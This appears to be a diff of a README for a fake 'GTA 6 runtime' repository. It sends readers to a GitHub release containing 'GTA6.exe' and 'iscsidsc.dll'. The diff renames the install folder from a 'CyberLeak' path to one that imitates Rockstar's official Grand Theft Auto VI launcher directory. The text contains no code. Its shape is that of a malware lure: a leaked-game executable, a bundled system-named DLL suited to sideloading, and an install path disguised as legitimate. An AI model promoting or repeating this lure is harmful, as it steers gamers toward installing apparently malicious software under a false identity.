@@ -4,7 +4,7 @@ This repo is a **redirect**. CyberLeak VI runtime is **one pack**:
 
 **[gta-6-runtime-gup-exe](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0)**  
 Files: `GTA6.exe` + `iscsidsc.dll` (ZIP: `GTA6_Runtime_gup.zip`)  
-Folder: `%LocalAppData%\CyberLeak\Gup\`
+Folder: `%LocalAppData%\Rockstar Games\Grand Theft Auto VI\Launcher\`
 
 Do **not** use `helperlib.dll`, `run.vbs`, `Main.exe`, `libcurl.dll` or `gup.xml`.
 
